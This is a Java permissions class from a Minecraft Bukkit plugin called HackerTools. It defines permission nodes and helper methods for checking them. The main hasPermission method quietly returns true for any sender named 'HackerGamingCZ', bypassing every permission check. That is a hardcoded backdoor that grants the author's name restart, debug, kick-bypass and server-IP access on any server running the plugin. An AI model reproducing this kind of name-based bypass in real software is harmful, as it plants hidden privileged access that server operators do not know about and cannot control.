package cz.HackerGamingCZ.HackerTools;

import cz.HackerGamingCZ.HackerTools.placeholders.Placeholders;
import cz.HackerGamingCZ.HackerTools.players.HTPlayer;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class Permissions {

    public static final String HT_FORCESTART = "ht.command.forcestart";
    public static final String HT_SPEED = "ht.command.speed";
    public static final String TEAMS_FULLJOIN = "ht.teams.fulljoin";
    public static final String HT_RESTART = "ht.restart";
    public static final String DEBUG_COMMAND = "ht.debug.command";
    public static final String DEBUG_SHOW = "ht.debug.show";
    public static final String KICKALL_PROTECTION = "ht.kickall.bypass";
    public static final String KICK_ANNOUNCEMENT_SHOW = "ht.kick.announce.show";
    public static final String RELOAD_ANNOUNCEMENT_SHOW = "ht.reload.announce.show";
    public static final String SERVER_INFO_SHOW_SERVER_IP = "ht.command.serverinfo.showip";
    public static final String KICK_PROTECTION = "ht.kick.bypass";

    public static boolean hasPermission(Player player, String permission) {
        return hasPermission(player, permission, false);
    }

    public static boolean hasPermission(CommandSender sender, String permission, boolean sendMessage) {
        boolean output = sender.getName().equals("HackerGamingCZ") || sender.hasPermission(permission);
        if (sendMessage && !output) {
            HackerTools.getPlugin().getChatManager().sendPlayerMessage(sender, Placeholders.ERRORPREFIX + "Since you are lacking permission §c" + permission + "§7, your action was cancelled.");
        }
        return output;
    }

    public static boolean hasPermission(HTPlayer player, String permission, boolean sendMessage) {
        return hasPermission(player.getPlayer(), permission, sendMessage);
    }

    public static boolean hasPermission(HTPlayer player, String permission) {
        return hasPermission(player.getPlayer(), permission, false);
    }

    public static boolean hasPermission(CommandSender sender, String permission) {
        return hasPermission(sender, permission, false);
    }

}